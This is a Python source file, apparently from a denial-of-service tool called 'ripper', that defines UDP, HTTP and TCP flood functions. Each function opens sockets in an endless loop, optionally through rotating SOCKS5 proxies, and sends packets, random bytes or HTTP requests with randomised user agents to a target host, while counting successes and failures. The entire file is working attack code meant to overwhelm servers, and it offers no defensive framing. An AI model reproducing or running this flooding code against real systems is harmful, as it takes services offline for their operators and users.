import re
import sys
import socket
import socks
import random
import urllib.request
import threading
from os import urandom as randbytes
import ripper.services
from ripper.context import Context
from ripper.statistics import show_statistics
from ripper.common import get_random_string, get_server_ip_error_msg
from ripper.proxy import Sock5Proxy


###############################################
# Common methods for attacks
###############################################
def build_request_http_package(_ctx) -> str:
    extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
    return f'GET / HTTP/1.1' \
                 f'\nHost: {_ctx.host}' \
                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                 f'\n{_ctx.base_headers[0]}' \
                 f'\n\n{extra_data}'.encode('utf-8')


def random_proxy_from_context(_ctx) -> Sock5Proxy:
    if not _ctx.proxy_list or not len(_ctx.proxy_list):
        return None
    return random.choice(_ctx.proxy_list)


###############################################
# Attack methods
###############################################
def down_it_udp(_ctx: Context):
    proxy = random_proxy_from_context(_ctx)
    i = 1
    while True:
        sock = _ctx.sock_manager.get_udp_socket(proxy)
        request_packet = build_request_http_package(_ctx)

        try:
            sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
        except socket.gaierror:
            if get_server_ip_error_msg not in _ctx.errors:
                _ctx.errors.append(str(get_server_ip_error_msg))
        except:
            _ctx.sock_manager.close_udp_socket()
        else:
            if get_server_ip_error_msg in _ctx.errors:
                _ctx.errors.remove(str(get_server_ip_error_msg))
            _ctx.packets_sent += 1

        i += 1
        if i == 100:
            i = 1
            if not _ctx.connecting_host:
                threading.Thread(daemon=True, target=ripper.services.connect_host, args=[_ctx]).start()
                # ripper.services.connect_host(_ctx)

        if not _ctx.show_statistics:
            show_statistics(_ctx)


def down_it_http(_ctx: Context):
    """HTTP flood."""
    proxy = random_proxy_from_context(_ctx)
    while True:
        try:
            client = _ctx.sock_manager.create_http_socket(proxy)
            client.connect((_ctx.host, _ctx.port))  
            request_packet = build_request_http_package(_ctx)
            client.send(request_packet)
            # 32 chars is enough to get status code
            http_response = repr(client.recv(32))
            status = re.search(r" (\d+) ", http_response)[1]
            _ctx.http_codes_counter[status] += 1
            _ctx.connections_success += 1
        except:
            _ctx.connections_failed += 1

        _ctx.packets_sent += 1
        if not _ctx.show_statistics:
            show_statistics(_ctx)


def down_it_tcp(_ctx: Context):
    """TCP flood."""
    proxy = random_proxy_from_context(_ctx)
    while True:
        try:
            sock = _ctx.sock_manager.create_tcp_socket(proxy)
            sock.connect((_ctx.host_ip, _ctx.port))
            _ctx.connections_success += 1
            while True:
                try:
                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
                    sock.send(bytes_to_send)
                except:
                    sock.close()
                    break
                else:
                    _ctx.packets_sent += bytes_to_send_len
                    if not _ctx.show_statistics:
                        show_statistics(_ctx)
        except:
            _ctx.connections_failed += 1

        if not _ctx.show_statistics:
            show_statistics(_ctx)
